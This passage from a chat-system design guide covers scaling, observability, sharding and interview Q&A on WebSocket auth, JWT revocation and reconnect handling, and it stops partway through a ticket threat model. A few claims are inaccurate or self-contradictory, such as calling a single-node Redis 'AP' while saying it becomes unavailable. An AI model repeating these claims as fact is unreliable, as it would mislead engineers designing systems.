100–10,000 members: Push to online members via Pub/Sub; offline get server-sent notification on reconnect
10,000+ members: Pub/Sub for online members in a sampled/priority subset; 
                  others pull on reconnect (pagination-based catch-up)
                  
For very large broadcast channels (> 100k):
  - Server tracks which members have received each message (bloom filter)
  - Uses a gossip protocol among server nodes to propagate without central bottleneck
  - CDN edge servers cache recent messages for fast reconnect catch-up
```

### 11.3 Engineering Tradeoffs

| Decision | Option A | Option B | Tradeoff |
|----------|---------|---------|---------|
| Message persistence timing | Sync (persist before ACK) | Async (ACK then persist) | A: durability, higher latency. B: speed, risk of message loss |
| Auth check caching | Redis cache (fast, stale risk) | Always DB (slow, always fresh) | A: performance, eventual consistency. B: correctness, higher DB load |
| Token algorithm | RS256 (asymmetric) | HS256 (symmetric) | A: microservices can verify without shared secret. B: simpler, faster |
| WebSocket auth | Query param token | First-message auth | A: simpler, logs tokens. B: slightly more code, safer |
| Message ID type | UUID v4 | Snowflake ID | A: simple, random, non-sequential. B: time-ordered, better DB performance |
| Read receipts | Write on every read | Batch every 500ms | A: accurate, high write load. B: slightly delayed, much lower load |

---

## 12. Observability

### 12.1 Structured Logging Schema

Every log line is a JSON object. Key fields are consistent across all services:

```json
{
  "timestamp": "2024-01-01T12:00:00.123456Z",
  "level": "INFO",
  "service": "websocket-server",
  "version": "3.2.1",
  "host": "ws-pod-7d6f9b",
  "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
  "span_id": "00f067aa0ba902b7",
  "user_id": "7197889234561024",
  "conversation_id": "conv-789",
  "event": "message.sent",
  "message_id": "7197889234561025",
  "content_length": 42,
  "content_type": "text/plain",
  "connection_id": "conn-abc123",
  "server_node": "node-A",
  "duration_ms": 8.3,
  "db_query_count": 2,
  "db_duration_ms": 5.1,
  "redis_hit": true,
  "ip": "104.x.x.x",
  "user_agent": "Mozilla/5.0..."
}
```

**Log taxonomy:**

| Category | Events | Retention | Storage |
|----------|--------|-----------|---------|
| Auth | login, logout, token refresh, failed auth, suspicious login | 1 year | S3 + Elasticsearch |
| Messaging | message sent, read, deleted, edited | 90 days | S3 + Elasticsearch |
| Security | rate limit hit, invalid JWT, CSP violation, origin rejected | 1 year | S3 + SIEM |
| Errors | 5xx responses, exceptions, timeouts | 30 days | Elasticsearch |
| Admin | user banned, conversation deleted, config change | 1 year | S3 + SIEM |
| Performance | P99 latency outliers (>2s), slow DB queries (>100ms) | 7 days | Elasticsearch |

**Never log:**
- Message content (privacy, potentially legally sensitive)
- Passwords (even hashed)
- Full JWT tokens or refresh tokens
- PII beyond what's necessary for the event

### 12.2 Metrics (Prometheus)

```
# WebSocket metrics
ws_connections_active{node="node-A"}          4523
ws_connections_total{result="success"}         189234
ws_connections_total{result="auth_failure"}    23
ws_connections_total{result="origin_rejected"} 7
ws_messages_per_second{type="message.send"}    1203.4
ws_messages_per_second{type="typing.start"}    3401.2
ws_frame_size_bytes{quantile="0.99"}           1240
ws_auth_duration_seconds{quantile="0.99"}      0.003

# Message pipeline
message_persist_duration_seconds{quantile="0.99"}  0.015
message_fanout_duration_seconds{quantile="0.99"}   0.003
message_delivery_e2e_seconds{quantile="0.99"}      0.065  ← Alice send to Bob receive
kafka_consumer_lag{topic="chat.messages", group="message-worker"}  120

# Auth
auth_jwt_verify_per_second                     5203
auth_jwt_verify_duration_seconds{quantile="0.99"}  0.0008
auth_login_per_second                          23.4
auth_login_failure_per_second                  0.3
auth_token_refresh_per_second                  401

# Database
db_query_duration_seconds{operation="SELECT",quantile="0.99"}  0.008
db_query_duration_seconds{operation="INSERT",quantile="0.99"}  0.012
db_connections_pool_size                        100
db_connections_pool_idle                        34
db_connections_pool_wait_seconds{quantile="0.99"}  0.002

# Redis
redis_commands_per_second                       45230
redis_command_duration_seconds{quantile="0.99"}  0.0005
redis_pubsub_channels_active                    12304
redis_pubsub_messages_per_second                18230
redis_memory_used_bytes                         8589934592  ← 8GB
redis_keyspace_hits_ratio                       0.987
```

### 12.3 Distributed Tracing

Every request carries a W3C Trace Context (`traceparent` header). The full trace for a message send:

```
Trace ID: 4bf92f3577b34da6a3ce929d0e0e4736

├─ Span: WS Server - frame received (0ms)
│    tags: user_id=alice, frame_type=message.send
│  ├─ Span: Auth middleware - JWT verify (0.8ms)
│  │    tags: cache_hit=true, user_id=alice
│  ├─ Span: Authorization - membership check (1.2ms)
│  │    tags: redis_hit=true, conv_id=conv-789, result=authorized
│  ├─ Span: Content validation (0.1ms)
│  │    tags: content_length=42, sanitized=false (no HTML found)
│  ├─ Span: PostgreSQL INSERT message (5.3ms)
│  │    tags: db_host=primary, rows_affected=1, message_id=msg-456
│  ├─ Span: Redis PUBLISH fanout (0.4ms)
│  │    tags: channel=conv:conv-789, subscriber_count=8
│  └─ Span: Kafka produce (0.7ms)
│       tags: topic=chat.messages, partition=3, offset=10293
│
└─ Span: Kafka Consumer - message worker (async, +50ms)
     ├─ Span: Update conversation.last_message_at (3.1ms)
     └─ Span: Notification worker - check offline users (8.2ms)
          └─ Span: FCM push notification (220ms) ← async, separate trace
```

### 12.4 Alerting Rules

**Page on-call immediately:**
- WebSocket server error rate > 1% for 3 minutes
- JWT validation failures > 100/minute (sustained — could be attack)
- PostgreSQL primary replication lag > 10 seconds
- Redis memory usage > 90%
- Kafka consumer lag for `chat.messages` > 10,000 messages
- Any error in the auth service (high-severity service)
- Certificate expiry < 14 days
- Concurrent unauthenticated WebSocket connections > 50,000

**Alert to Slack (non-page):**
- P99 message end-to-end latency > 500ms for 5 minutes
- Rate limit events > 10,000/minute (could be benign traffic spike or attack)
- CSP violation reports spiking (potential XSS attempt)
- 4xx error rate > 5% (bad client behavior, possible scanning)
- Redis keyspace hit rate drops below 80% (cache eviction increasing)

**Never alert on (noisy, expected):**
- Individual JWT expiry errors (users simply need to refresh)
- Individual WebSocket connection close events (normal)
- Single DB query > 100ms (occasional; alert on sustained p99)
- Push notification delivery failures (FCM/APNs have non-100% delivery)

---

## 13. Scaling Considerations

### 13.1 Bottleneck Analysis

```
Component            Bottleneck Type    Scaling Approach
─────────────────────────────────────────────────────────────────────
WebSocket Server     CPU (message proc) Horizontal (add pods)
                     FD limit           Per-pod OS config
                     Memory (conns)     Horizontal

Redis Pub/Sub        Memory             Cluster sharding by channel
                     CPU (single-thread) Multiple Redis instances, key sharding
                     Pub/Sub throughput  Redis Streams as alternative

PostgreSQL (writes)  Write IOPS         Vertical (larger instance)
                     Connection count   PgBouncer transaction mode
                     Lock contention    Partition large tables

PostgreSQL (reads)   Query throughput   Read replicas (up to 5-10x reads)
                     Index size in RAM  Vertical (more RAM for shared_buffers)

Kafka                Write throughput   More partitions (more parallelism)
                     Consumer lag       More consumer instances

Elasticsearch        Indexing rate      More data nodes
                     Query throughput   More replica shards
                     Heap size          Vertical (≤ 32GB JVM heap per node)
```

### 13.2 The WebSocket Horizontal Scaling Problem

WebSocket connections are stateful and long-lived. Unlike HTTP, a WebSocket connection is pinned to one server node. Horizontal scaling requires:

**Layer 4 load balancing (TCP sticky sessions):**
```
Client ──── L4 LB (consistent hash on source IP+port) ──── Server Node A (pinned)
```
IP-based hashing keeps the connection on the same node after reconnects from the same IP. But mobile users change IPs frequently.

**L7 sticky sessions (cookie-based):**
```
Client ──── L7 LB (Nginx/HAProxy) ──── set cookie: ws-server=node-A
                                    ──── route requests with ws-server=node-A to Node A
```
The load balancer issues a sticky cookie on first connection. Subsequent connections from the same browser go to the same backend. This works for reconnects.

**Why Redis is the real solution:**
The better design is to not rely on stickiness. Instead, each WebSocket connection is tracked in Redis, and messages can be routed to any node via Pub/Sub. Any node can handle any connection. Reconnecting to a different node works transparently.

### 13.3 Read vs Write Scaling

```
Read traffic (GET conversations, GET messages):
──────────────────────────────────────────────
  L1: Browser cache (static assets only)
  L2: CDN (not for personalized data)
  L3: Redis cache (60s TTL) ← handles 95% of reads
  L4: PostgreSQL read replica (for cache misses)
  Scaling: Add read replicas; scale Redis horizontally

Write traffic (send message, update read status):
──────────────────────────────────────────────────
  Cannot be cached — must hit PostgreSQL primary
  Bottleneck: PostgreSQL write throughput (~10,000 writes/second on c5.xlarge)
  Scaling: 
    - Write batching (accumulate writes, batch INSERT)
    - Async writes via Kafka (decouple write acknowledgement from persistence)
    - Table partitioning (messages partitioned by conversation_id or time)
    - Consider Cassandra for extreme write throughput (designed for write-heavy workloads)
```

### 13.4 Consistency Tradeoffs

| Feature | Consistency Required | Acceptable Tradeoff |
|---------|---------------------|---------------------|
| Message ordering | Strong — messages must be ordered by send time | Use Snowflake IDs; DB is source of truth |
| Read receipts | Eventual — 1-2 second delay is fine | Batch writes; read from cache |
| Typing indicators | None — best effort, ephemeral | Redis Pub/Sub fire-and-forget |
| Presence (online/offline) | Eventual — 5-10 second lag acceptable | TTL-based heartbeat in Redis |
| Unread counts | Eventual — occasional miscounts tolerable | Computed from last_read_message_id |
| Message delivery | At-least-once — retransmit if unsure | Client deduplicates by message ID |

**Message delivery guarantee:**
The system implements at-least-once delivery. If the server delivers a message and the client's WebSocket connection drops before the client sends a read confirmation, the server will re-deliver the message on reconnect. The client uses the message ID to deduplicate (if `message_id=msg-456` is already in the local store, ignore the duplicate delivery).

---

## 14. Interview Questions

### Q1: WebSocket connections are stateful. How do you scale the WebSocket tier horizontally, and what happens when a node fails?

**Answer:**

Stateful means each WebSocket connection is pinned to one server node. Scaling requires solving two sub-problems: routing new messages to the correct node, and handling node failures.

**Routing:** Each server node maintains a connection registry in Redis: `HSET ws_registry user:{user_id} node:{node_id}:conn:{conn_id}`. When Alice sends a message to a conversation, the server looks up all conversation members, finds their node assignments, and routes messages to the correct nodes via Redis Pub/Sub. Each node subscribes to channels for conversations it's serving.

**Node failure:** If Node A crashes, all connections to it drop. Clients detect this via the WebSocket `close` event (or a network timeout, typically detected in 30-90 seconds). Clients implement exponential backoff reconnect logic. On reconnect to any surviving node, the client sends a `reconnect` message with its last-seen message ID. The server delivers all missed messages from the DB. The connection registry in Redis has a TTL (refreshed by heartbeat), so dead connections auto-expire without manual cleanup.

**The catch:** If Node A crashes non-gracefully (kernel panic, OOM kill), the OS closes all TCP connections with RST packets. Clients see an immediate disconnect and reconnect within seconds. If the node is merely slow (GC pause, high CPU), connections linger and the user experiences frozen chat. This is harder to detect — the server must implement a message-level heartbeat (ping/pong) with a timeout to detect and close zombie connections.

---

### Q2: How do you guarantee message ordering in a distributed system where multiple users can send messages to the same conversation simultaneously?

**Answer:**

The problem: Alice and Bob both send messages at the same millisecond. Both messages arrive at (possibly different) server nodes. How do you ensure a consistent ordering that all participants see?

**The naive approach** (assign timestamp on receipt) fails because:
- Server clocks can drift (NTP provides only ~10ms accuracy)
- Two messages received at the same millisecond have the same timestamp
- The order depends on which database write commits first — which is non-deterministic

**The correct approach** depends on what ordering guarantee you need:

**Approach 1: Serializable DB write ordering (PostgreSQL)**
All messages in a conversation are written to PostgreSQL with a `conversation_id` + sequential counter in a transaction. PostgreSQL's row-level locking ensures that two concurrent INSERTs with the same `conversation_id` serialize. The one that commits first gets the lower message ID. This is correct but creates a write bottleneck per conversation.

**Approach 2: Snowflake ID generation**
Snowflake IDs are generated by the receiving server node and are approximately time-ordered. Two messages received within the same millisecond on different nodes could have non-deterministic ordering (different worker IDs → different IDs at the same timestamp). Within the same millisecond on the same node, the sequence number provides ordering. This is good enough for most chat applications — exact ordering within a millisecond is not user-observable.

**Approach 3: Vector clocks / Logical clocks (distributed systems correctness)**
Each message carries a Lamport timestamp or vector clock. Recipients can determine causal ordering regardless of network reordering. Used in distributed databases (Cassandra, CRDTs) but adds complexity to the client. Not typical for consumer chat but used in collaborative editing systems.

**What If:** "What if we use Cassandra instead of PostgreSQL?" Cassandra's write path is different — there's no global sequence. You'd use a combination of the partition key (conversation_id), a clustering key (message_id), and last-write-wins conflict resolution. Within a partition, Cassandra maintains order by clustering key. Ordering is correct within a partition; you choose the message ID format to be time-sortable (Snowflake or TimeUUID).

---

### Q3: A user reports they sent a message but it never appeared for the recipient. Walk through every place this could have failed.

**Answer (systematic diagnosis):**

```
1. Did Alice's client send the frame?
   → Check browser DevTools Network tab (WS frames visible)
   → Check client-side logs: did ws.send() succeed?

2. Did the server receive it?
   → Check ws_server logs: trace_id appears?
   → If no: connection dropped between send and receive; 
     client should have detected disconnect and queued for resend

3. Did the server validate/authorize it?
   → Check logs: auth failure? authorization failure?
   → 401/403 would cause the server to drop the frame silently (or send an error frame)
   → Fix: client should handle server error responses

4. Did the server persist it to PostgreSQL?
   → Check db logs: INSERT appears? Any errors?
   → If DB was down: server should return error to client; client should show failure state
   → If DB was slow (>5s): server timed out, returned error? Or succeeded eventually?

5. Did the server publish to Redis Pub/Sub?
   → Check Redis MONITOR or Pub/Sub subscription logs
   → If Redis was unavailable: message persisted to DB but not delivered in real-time
   → Bob would get the message on next API poll or reconnect (catch-up mechanism)

6. Did Bob's server node receive the Pub/Sub event?
   → Check Node B logs: did it receive the published message?
   → If Bob was on Node B which was also down: 
     Bob gets message on reconnect from catch-up

7. Was Bob's WebSocket connection healthy?
   → Check connection registry: did Bob have an active WS connection?
   → If Bob's connection was in a zombie state (network partition, no heartbeat): 
     the write to his connection would have failed silently
   → Fix: server must track write failures and fall back to push notification

8. Did Bob's client render the message?
   → Check client logs: did the frame arrive? Did the JSON parse? Did React re-render?
   → Browser throttling in background tabs can delay frame processing
```

The systematic walkthrough demonstrates the value of distributed tracing: a single `trace_id` should connect all of steps 1–8.

---

### Q4: How does your typing indicator implementation ensure it doesn't cause a thundering herd problem in a 10,000-member channel?

**Answer:**

A naive implementation: every keypress triggers a `typing.start` WebSocket message → server publishes to Redis Pub/Sub → all 10,000 nodes receive it → each node pushes to all connected members. If all 10,000 members are online and 50 people type simultaneously, that's 50 × 10,000 = 500,000 Redis pub/sub events and 500,000,000 WebSocket frame writes per second. This is catastrophically unscalable.

**Solution: Rate limiting + sampling + size-based routing**

**Step 1: Client-side rate limiting**
The client sends `typing.start` at most once every 3 seconds, regardless of keypress frequency. The server receives at most 1/3s per user.

**Step 2: Deduplication on server**
The server uses a Redis key `typing:{conv_id}:{user_id}` with TTL=5s. Before publishing, check if this key exists (SET NX). If it does (user already indicated typing recently), skip the publish. This prevents publishing the same typing event repeatedly.

```
IF NOT EXISTS typing:{conv_id}:{user_id}:
    SET typing:{conv_id}:{user_id} 1 EX 5
    PUBLISH conv:{conv_id}:typing { user: user_id, expires: now+5s }
```

**Step 3: Size-based routing**
For channels with >1000 members, typing indicators are simply disabled or sampled (show only 3 concurrent typers max — "Alice, Bob, and 2 others are typing").

**Step 4: Pub/Sub fan-out limit**
Only online members (members with active WS connections) receive typing events. A bloom filter or approximate set (Redis HyperLogLog) tracks which members are currently online per conversation. Pub/Sub messages are only pushed to nodes that have at least one online member for that conversation.

**What If:** "What if the typing indicator Redis key expires exactly when the user stops typing, and then they type again?" The system correctly sends a new `typing.start` because the key no longer exists, so SET NX succeeds. A brief gap in the indicator is acceptable — the 5-second TTL acts as an implicit `typing.stop`.

---

### Q5: Describe the exact sequence of operations needed to ensure a message is durably stored AND delivered, without either double-delivery or loss, even if the server crashes mid-operation.

**Answer:**

This is the core reliability challenge. There are three phases, each with failure modes:

```
Phase 1: Client sends message
  Client generates client_msg_id (UUID)
  Client sends WS frame
  Client starts a delivery timeout (e.g., 10 seconds)
  
Phase 2: Server persists
  Server receives frame
  Server assigns server message_id (Snowflake)
  Server writes to PostgreSQL:
    INSERT INTO messages (id, conversation_id, sender_id, content, client_msg_id) ...
    -- client_msg_id has a UNIQUE constraint
    -- If server crashes here, nothing is committed. Client times out, resends.
    -- The resend inserts the same client_msg_id → unique constraint violation → server
    -- knows this is a retry, returns the existing message_id. No duplicate.
  
  Server sends ACK to client:
    { type: "message.ack", client_msg_id: "...", message_id: "..." }
    -- If server crashes after INSERT but before ACK:
    -- Client times out, resends. Unique constraint catches duplicate. ACK sent.
    -- Client deduplicates on client_msg_id. Correct.
  
Phase 3: Server delivers to recipients
  Server publishes to Redis Pub/Sub (best-effort, fire-and-forget)
  -- If Redis is down: message is persisted in DB but not delivered in real-time.
  -- Fallback: Kafka consumer notices message in DB, sends push notification.
  -- On reconnect: Bob's client fetches messages since last_seen → catches up.
  
  Server publishes to Kafka (for push notifications, analytics)
  -- Kafka producer is idempotent: produces at-least-once, but Kafka deduplicates
  -- using producer epoch + sequence number. Consumers receive exactly once
  -- (with transactional consumer). Even if server crashes and retries, no duplicate.
```

**The key insight:** The `client_msg_id` with a database UNIQUE constraint provides idempotent message creation. The client can safely retry any number of times after a failure. The server's response is idempotent — it always returns the same `message_id` for the same `client_msg_id`.

---

### Q6: How would you implement end-to-end encryption (E2EE) in a chat system where the server currently decrypts and stores messages?

**Answer:**

E2EE means the server never has access to message content. This fundamentally changes the architecture.

**Key management (the hard part):**

Each device generates an asymmetric key pair (X25519 or X448) on first launch. The public key is uploaded to the server. The private key never leaves the device. This is identical to Signal's approach.

**Per-conversation key exchange:**

When Alice starts a conversation with Bob:
1. Alice fetches Bob's public key from the server
2. Alice generates a random 256-bit session key (symmetric)
3. Alice encrypts the session key with Bob's public key: `encrypted_key = encrypt(session_key, bob_pub_key)`
4. Alice encrypts the message: `ciphertext = AES-256-GCM(session_key, message)`
5. Alice sends both to the server: `{ to: bob, encrypted_key: "...", ciphertext: "..." }`
6. The server stores the ciphertext (cannot read it) and delivers to Bob
7. Bob decrypts: `session_key = decrypt(encrypted_key, bob_private_key)`, then `message = AES-256-GCM.decrypt(session_key, ciphertext)`

**Double Ratchet (for forward secrecy and break-in recovery):**
The session key is not reused. After each message, a new key is derived (a "ratchet step") using HKDF. Compromise of the current session key does not expose past messages (forward secrecy) and future message keys are derived from user-supplied randomness (break-in recovery). This is the Signal Protocol.

**Group chats:**
Each group has a shared group key. When a member is added or removed, the group key is rotated and re-distributed (encrypted with each member's public key) — this is the Sender Keys protocol.

**What the server stores:** Encrypted ciphertext (opaque blobs). Public keys. Encrypted session keys (only the recipient can decrypt). Metadata: who sent to whom, when, how large (metadata is still visible to the server — E2EE does not hide metadata).

**What the server loses:**
- Full-text search (cannot search encrypted content)
- Content moderation (cannot detect spam/CSAM in encrypted messages)
- Legal compliance (cannot respond to law enforcement requests for content)
- Message backup on server side (each device must back up its own keys)

This is the fundamental tension between E2EE and server-side features.

---

### Q7: Your chat system needs to support 1 billion messages per day. How do you partition/shard the message storage, and what are the query implications?

**Answer:**

1 billion messages/day = ~11,600 messages/second. PostgreSQL on a c5.4xlarge can handle ~15,000-20,000 simple INSERTs/second with good tuning. Barely feasible with a single primary, but no headroom.

**Sharding strategy:**

**Option 1: Shard by conversation_id (range or hash)**
```
Shard 0: conversation_ids 0 to 999,999
Shard 1: conversation_ids 1,000,000 to 1,999,999
...
```

Queries for a single conversation always go to one shard (efficient). Cross-conversation queries (e.g., "search across all my conversations") require fan-out to multiple shards. The shard a conversation lives on never changes (unless you re-shard).

**Option 2: Shard by user_id (for user-centric queries)**
All data for a user (their messages, conversations) on one shard. Efficient for "show me everything for user X." But: a conversation between user A (shard 0) and user B (shard 3) — where does the message live? Answer: both shards (replicated). This is what Facebook's Messenger did — store each message twice, once per participant's shard.

**Option 3: Time-based partitioning within a shard**
PostgreSQL table partitioning by month: `messages_2024_01`, `messages_2024_02`, etc. Old partitions become read-only and can be moved to cheaper storage (cold tier). New partitions are on fast NVMe. Queries always include a date range (enforced at application layer), so the query planner only scans the relevant partition(s).

**Best approach for chat: Horizontal sharding by conversation_id + time partitioning within shard**

```
message_id → shard = hash(conversation_id) % num_shards
within shard → partition = message timestamp (month/quarter)
```

**Query implications:**
- Fetch conversation history: single shard, single partition, fast
- Global search: fan-out to all shards (Elasticsearch handles this; don't query PostgreSQL for search)
- "Conversations modified recently for user X": requires knowing which shards hold user X's conversations → maintained in a routing table (Redis)
- Cross-shard transactions: not possible without distributed transaction coordinator (2PC) → avoid by designing operations to be single-shard

**Why not Cassandra?**
Cassandra is optimized for this exact use case: high write throughput, range queries by partition key (conversation_id) and clustering key (message_id). Netflix, Instagram, and Discord's message history uses Cassandra. Tradeoff: Cassandra has no ACID transactions, no joins, and tunable consistency — you must design your data model around your access patterns before writing a line of code.

---

### Q8: A user's account is compromised. What's the fastest way to revoke all their active sessions without affecting other users?

**Answer:**

Revocation is the Achilles heel of stateless JWTs. By design, a JWT is self-contained — the server does not look it up. This means there's no "call home" to check if it's been revoked.

**Approach 1: JTI blocklist (fast, scales to millions of tokens)**
Every JWT has a unique `jti` claim. On logout or compromise, add `jti` to a Redis set: `SADD revoked_jtis {jti}`. Set the TTL of each key to the token's remaining lifetime. On every JWT verification, after signature check, check Redis: `SISMEMBER revoked_jtis {jti}`. If found: reject.

The cost: every API request now requires a Redis lookup. Redis is fast (~0.5ms), so this adds <1ms to every request. Acceptable.

The problem: For a compromised account, you need to revoke ALL active tokens, not just one. You don't know all the `jti` values — you only have one if you captured it.

**Approach 2: User-level token generation counter**
Add a `token_version` counter to the user record. Embed `token_version` in every JWT. On compromise, increment `token_version` in the DB. On JWT verification, check `user.token_version == jwt.token_version`. If not equal, reject.

```
user table: { id: alice, token_version: 3 }
Current JWT: { sub: alice, token_version: 3, exp: ... }  ← valid
On compromise: UPDATE users SET token_version = token_version + 1 WHERE id = alice
→ token_version = 4
Any JWT with token_version: 3 is now invalid, regardless of exp
```

This requires one DB lookup per authentication check (or cached version in Redis with short TTL). But it invalidates ALL of Alice's tokens atomically with one UPDATE statement.

**Approach 3: Refresh token revocation + short access token lifetime**
If access tokens expire in 15 minutes, the maximum exposure window is 15 minutes. Delete the compromised user's refresh token from Redis immediately. The attacker cannot refresh. Within 15 minutes, all access tokens expire. No active blocklist needed. Just wait.

**The real answer: Use approach 2 (token_version) for instant revocation + approach 3 (short lifetime) as backstop. Cache the token_version in Redis with 60-second TTL to avoid DB lookup on every request. Worst case: 60 seconds for revocation to propagate.**

**What If:** "What if Redis is down when you try to revoke?" The token_version is in PostgreSQL (authoritative). If Redis is down, reads fall through to PostgreSQL directly — slower but correct. The revocation is not lost.

---

### Q9: How do you handle the "thundering herd" when 10,000 clients all reconnect simultaneously after a server restart?

**Answer:**

Server restarts cause all connected clients to receive a WebSocket close event simultaneously. All 10,000 clients start their reconnect timers. If all retry at time T+5 seconds, the server receives 10,000 connection requests simultaneously — potentially overwhelming it at startup.

**Client-side: Exponential backoff with jitter**
```javascript
function reconnect(attempt) {
  const base = 1000; // 1 second
  const max = 30000; // 30 seconds cap
  const exponential = Math.min(max, base * Math.pow(2, attempt));
  // Add ±25% jitter to spread reconnections
  const jitter = exponential * (0.75 + Math.random() * 0.5);
  setTimeout(() => connect(), jitter);
}
```

With 10,000 clients and jitter spread over 30 seconds, that's ~333 reconnections/second — manageable.

**Server-side: Connection rate limiting at load balancer**
The load balancer limits new connection establishment to a fixed rate (e.g., 500/second per pod). Excess connections receive a `503 Service Unavailable` with `Retry-After: 10`. The client backs off and retries. This prevents the server from being overwhelmed even if clients don't implement jitter.

**Server-side: Graceful restart**
Instead of killing all connections, use a rolling restart. In Kubernetes: `maxUnavailable: 0, maxSurge: 1` in the deployment strategy. New pods start up and are health-checked. Only after new pods are healthy does Kubernetes drain connections from old pods (sends SIGTERM, old pod sends WebSocket close frames with code 1001 "Going Away" and reason "server restart"). Clients see a graceful close, reconnect to new pod. Traffic ramps down from old pod → up to new pod gradually. No thundering herd.

**Server-side: Message catch-up on reconnect**
When a client reconnects, it sends `{ type: "reconnect", last_message_id: "msg-456" }`. The server fetches all messages since `msg-456` from PostgreSQL and delivers them. This design means clients are not dependent on the WebSocket being continuous — they can tolerate reconnections transparently.

---

### Q10: Explain exactly how a message read receipt flows through the system, from Bob reading Alice's message to Alice seeing the blue checkmark.

**Answer:**

```
Step 1: Bob's client detects the message is "read"
  Conditions: 
  - Browser tab is focused (document.hasFocus() = true)
  - The message element is in the viewport (Intersection Observer API)
  - The message_id is newer than Bob's last_read_message_id for this conversation
  
  Bob's client debounces: if multiple messages scroll into view, wait 500ms, 
  then send one bulk read receipt for the highest message_id seen.

Step 2: Bob sends read receipt via WebSocket
  { "type": "message.read", 
    "conversation_id": "conv-789", 
    "last_read_message_id": "msg-456" }

Step 3: Server receives and validates
  - Is Bob a member of conv-789? (Redis membership check)
  - Is msg-456 a valid message in conv-789? (Redis or DB check)
  - Is msg-456 newer than Bob's current last_read_message_id? (compare IDs, Snowflake IDs are time-ordered)

Step 4: Server updates read receipt (optimistic, async)
  Option A (synchronous): UPDATE read_receipts SET last_read_message_id = 456, updated_at = NOW()
    WHERE conversation_id = 'conv-789' AND user_id = 'bob' AND last_read_message_id < 456
  
  Option B (async): Publish to Kafka "chat.read-receipts", consumer batches and writes
  
  The WHERE clause (last_read_message_id < 456) prevents a race condition where an older 
  read receipt overwrites a newer one (e.g., if two devices send receipts simultaneously).

Step 5: Server delivers read receipt to Alice via WebSocket
  - Look up Alice's connection in Redis: ws_registry:user:alice → node-A:conn-123
  - If Alice on same node: push directly
  - If Alice on different node: Redis PUBLISH user:alice:events { type:"read_receipt", ... }
  - Node A receives Pub/Sub message, pushes to Alice's WebSocket:
    { "type": "read.receipt", "conversation_id": "conv-789", 
      "user_id": "bob", "last_read_message_id": "msg-456" }

Step 6: Alice's client updates UI
  - React state: messages with id ≤ msg-456 sent to conv-789 update their delivery status to "read"
  - UI: single checkmark → double checkmark → blue double checkmark
  - This is a re-render of the checkmark icon only (minimal DOM change)

Step 7: Persistence
  - The DB read receipt serves as source of truth for unread count calculation
  - When Bob reconnects, the server fetches his last_read_message_id from DB
  - Unread count = count of messages in conv-789 where id > bob.last_read_message_id
  - This count is served from cache: Redis ZCOUNT or precomputed counter
```

**Edge case:** What if Alice is offline when Bob reads the message? The server cannot push to Alice's WebSocket. The read receipt is stored in the DB. When Alice reconnects, the server delivers the current read receipt state as part of the catch-up payload. Alice sees the blue checkmark when she opens the app, even though the read event happened hours earlier.

---

### Q11: How does your system handle network partitions between the WebSocket server and Redis, and what's the user experience during the partition?

**Answer:**

A network partition between WebSocket servers and Redis is one of the most dangerous failure modes because Redis is used for:
1. WebSocket connection registry (routing)
2. Pub/Sub fan-out (delivery)
3. Session/token cache (authentication)
4. Rate limiting (abuse prevention)
5. Membership checks (authorization)

**What breaks during partition:**

**Authentication:** JWT verification falls back to full RS256 signature verification against the JWKS endpoint (no cache). If the JWKS endpoint is also down (it's often served by the auth service, not Redis), authentication fails for NEW connections. Existing authenticated connections remain authenticated — the server trusts them until the connection closes.

**Message delivery:** A message sent by Alice is persisted to PostgreSQL (assuming the WS server still reaches the DB). But the Redis PUBLISH fails. Bob does not receive the message in real-time. The message is in the DB, so Bob gets it on reconnect. Alice sees "sending..." indefinitely — the server sent the ACK (message persisted), but real-time delivery failed.

**New connections:** Without the Redis connection registry, routing breaks. New connections can still be accepted, but the server cannot know which other node Bob is on. Fan-out degrades to: only push to members connected to THIS node. Other members get messages on reconnect.

**Session validation:** If using Redis-based sessions (not JWT), login fails completely. JWT-based auth avoids this by not requiring Redis for every validation.

**CAP theorem analysis:**
- Redis is an AP (Availability + Partition tolerance) system if deployed without cluster (single node). During partition, it's unavailable.
- Redis Cluster is also AP: in a partition, some nodes may be unavailable, others serve requests. Keys on unavailable nodes return errors.
- The chat system must decide: CP (consistent delivery, reject writes during partition) or AP (continue accepting messages, risk duplicate delivery or temporary divergence).

**Best practice:** Accept writes (messages) to PostgreSQL even without Redis (AP choice). Use Redis for delivery only, not as the authoritative store. On partition recovery, PostgreSQL is the source of truth. Run a catch-up job on reconnect.

**What the user experiences:**
- Messages they send persist and will be delivered when connectivity restores (they see "sending..." for longer than usual)
- Incoming messages are delayed until reconnect
- Typing indicators stop working
- Presence shows everyone as offline (Redis presence cache unavailable)
- If partition lasts > 5 minutes: push notifications fire for offline users (Kafka consumer reaches notification worker which doesn't use Redis)

---

### Q12: What is the complete threat model for the WebSocket authentication flow using the "short-lived ticket" approach, and what residual risks remain?

**Answer:**

**The ticket flow (recap):**
1. Client calls `POST /api/ws/ticket` with valid JWT access token → server issues short-lived (30s), single-use ticket, stores in Redis with TTL=30s.
2. Client opens WebSocket with ticket in URL: `wss://chat.example.com/ws?ticket=ws-ticket-abc`
3. Server validates ticket against Redis (GETDEL — atomic get and delete, single use), upgrades connection.

**Threats and analysis:**

**Threat 1: Ticket interception (man-in-the-middle)**
Attack: Attacker intercepts the `wss://...?ticket=...` URL before the client uses it.
Mitigation: TLS prevents this. An attacker on the network cannot see the URL contents (the entire HTTP request, including the URL, is encrypted within TLS). If TLS is compromised (e.g., via a malicious root CA installed on the device), all bets are off — but this is outside the WebSocket threat model.
Residual risk: Malicious browser extension or proxy on the user's device can see the URL. This is a device-compromise scenario, out of scope for server-side mitigations.

**Threat 2: Ticket replay**
Attack: Attacker captures the ticket from logs and uses it.
Mitigation: Single-use (GETDEL in Redis), 30-second TTL. By the time an attacker can extract the ticket from logs (assuming log pipeline latency > 30 seconds), it's expired. Even if log pipeline is fast, first use of the ticket (by the legitimate client) deletes it. A second use returns "not found" → reject.
Residual risk: Race condition between legitimate use and attacker use. If the attacker is faster than the legitimate client (e.g., they capture the ticket before the client sends the WS upgrade), they win. Mitigation: bind ticket to source IP at issuance; reject if used from a different IP (impractical for mobile users on changing IPs, but reduces exposure).

**Threat 3: Ticket brute force**
Attack: Attacker tries all possible ticket values.
Mitigation: Ticket is 256-bit random (32 bytes from CSPRNG). Brute forcing 2^256 values is computationally infeasible for any foreseeable technology. 30-second TTL means even an impossibly fast attacker would have to do it in 30 seconds.

**Threat 4: Redis compromise (ticket storage)**
Attack: Attacker gains read access to Redis, extracts all valid tickets.
